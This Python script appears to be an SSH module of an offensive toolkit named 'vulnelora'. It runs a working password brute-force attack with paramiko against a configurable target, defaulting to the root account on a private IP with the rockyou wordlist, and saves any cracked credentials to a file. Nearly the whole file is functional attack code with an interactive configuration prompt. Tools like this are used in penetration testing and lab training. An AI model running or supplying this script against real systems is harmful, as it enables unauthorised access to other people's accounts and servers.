import subprocess
import sys
import os
import paramiko
import socket
import json


service_path = "/opt/vulnelora"
save_flag = 0

attack_config = {'username': "root",
'password_list': "/opt/vulnelora/resources/rockyou.txt",
'target_ip': "192.168.94.54",
'target_port': 22
}


def check_save():
    if save_flag == 0:
        print("\n>> Current attack configuration not saved, would you like to save it? [y/n] ", end='')
        save_req = input()

        if save_req.strip().lower() == "y":
            print("\n>> Enter path (including file name) where the attack configuration should be saved: ", end='')
            path = input()
            save_conf(path)
        elif save_req.strip().lower() == "n":
            pass
        else:
            print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")


def ssh_connection(t_host, t_port, uname, passwd):
    result = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(t_host, port=t_port, username=uname, password=passwd)
    except paramiko.AuthenticationException:
        result = 1
    except socket.error:
        result = 2

    ssh.close()
    return result


def bruteforce():
    list_path = attack_config['password_list']

    with open(list_path, 'r', errors='replace') as records:
        for record in records.readlines():
            password = record.strip()
            try:
                response = ssh_connection(attack_config['target_ip'], attack_config['target_port'], attack_config['username'], password)
                if response == 0:
                    print(f"[SUCCESS]: Discovered credentials: {attack_config['username']}:{password}\n")
                    with open(service_path + "/resources/creds/ssh_creds.txt", 'w') as cred_file:
                        cred_file.write(attack_config['username'] + '\n')
                        cred_file.write(str(password) + '\n')
                    print(f"[INFO]: Newly discovered login credentials stored in {service_path}/resources/creds/ssh_creds.txt\n")
                    break
                elif response == 1:
                    print(f">> Failed login attempt for: {attack_config['username']}:{password}")
                elif response == 2:
                    print(f"[ERROR] Cannot connect to {attack_config['target_ip']}:{attack_config['target_port']}")
                    exit(1)
            except Exception as e:
                print(e)
                pass


def extract(text, value):
    return text[len(value)+1:].strip()


def validate_path(value):
    if os.path.exists(value):
        return os.path.getsize(value) > 0
    else:
        return 0


def print_args():
    formatted_args = json.dumps(attack_config, indent=4)
    print(formatted_args)


def save_conf(path):
    with open(path, 'w') as file_w:
        json.dump(attack_config, file_w)
    with open(path, 'r') as file_r:
        file_content = json.load(file_r)
        if file_content == attack_config:
            global save_flag
            save_flag = 1
            print(f"\n>> [SUCCESS]: Current attack configuration saved successfully in '{path}'!")
        else:
            print("\n>> [ERROR]: Attack configuration has not beed saved correctly due to unknown error. Please, try again.")


def transfer_conf(loaded_conf):
        global attack_config
        attack_config.update(loaded_conf)


def argument_parser():
    argument = sys.argv[1]
    base_name, extension = os.path.splitext(argument)

    while True:
        print(f"\033[96m\nvulora\033[0m[\033[91m{base_name}\033[96m]>\033[0m ", end='')
        arg_input = input()

        if arg_input == "help":
            with open(service_path + '/modes/help_messages/ssh_exploit.txt', 'r') as file:
                file_content = file.read()
                print(file_content)
        elif "username" in arg_input:
            tmp_username = extract(arg_input, "username")
            attack_config['username'] = tmp_username
            print(f"\n>> Set argument: username={tmp_username}")
        elif "password_list" in arg_input:
            tmp_password_l = extract(arg_input, "password_list")
            if validate_path(tmp_password_l):
                attack_config['password_list'] = tmp_password_l
                print(f"\n>> Set argument: password_list={tmp_password_l}")
            else:
                attack_config['password_list'] = "/opt/vulnelora/resources/rockyou.txt"
                print("\n>> Set argument: password_list='/opt/vulnelora/resources/rockyou.txt' (revert to default value, given path does not exist)")
        elif "target_ip" in arg_input:
            tmp_target_ip = extract(arg_input, "target_ip")
            attack_config['target_ip'] = tmp_target_ip
            print(f"\n>> Set argument: target_ip={tmp_target_ip}")
        elif "target_port" in arg_input:
            tmp_target_port = extract(arg_input, "target_port")
            attack_config['target_port'] = tmp_target_port
            print(f"\n>> Set argument: target_port={tmp_target_port}")
        elif arg_input == "print":
            print("\n>> Current argument configuration:")
            print_args()
        elif "save" in arg_input:
            tmp_path = extract(arg_input, 'save')
            if validate_path(tmp_path):
                print("\n>> Path to save current attack configuration already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    save_conf(tmp_path)
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_path != "":
                    save_conf(tmp_path)
                else:
                    print("\n>> [ERROR]: Attack configuration not saved. Please, input a valid path (including file name).")
        elif "load" in arg_input:
            tmp_path = extract(arg_input, 'load')
            if validate_path(tmp_path) and tmp_path != "":
                with open(tmp_path, 'r') as file:
                    file_content = json.load(file)
                    transfer_conf(file_content)
                    if attack_config == file_content:
                        print("\n>> [SUCCESS]: Attack configuration has been loaded successfully! Current configuration is:")
                        print_args()
                    else:
                        print("\n>> [ERROR]: Attack configuration has not been loaded due to unknown error. Please, try again.")
            else:
                print("\n>> [ERROR]: File does not exist.")
        elif arg_input == "finish":
            print("\n>> Final attack configuration:")
            print_args()
            print()
            check_save()
            break
        elif arg_input == "exit":
            check_save()
            exit(0)
        else:
            print(f"\n[ERROR]: Unknown argument '{arg_input}'. Type 'help' to see the supported arguments.")


try:
    argument_parser()
    print(f"\n[INFO]: Starting the bruteforce attack...\n")
    bruteforce()

except KeyboardInterrupt:
    exit(0)

exit(0)
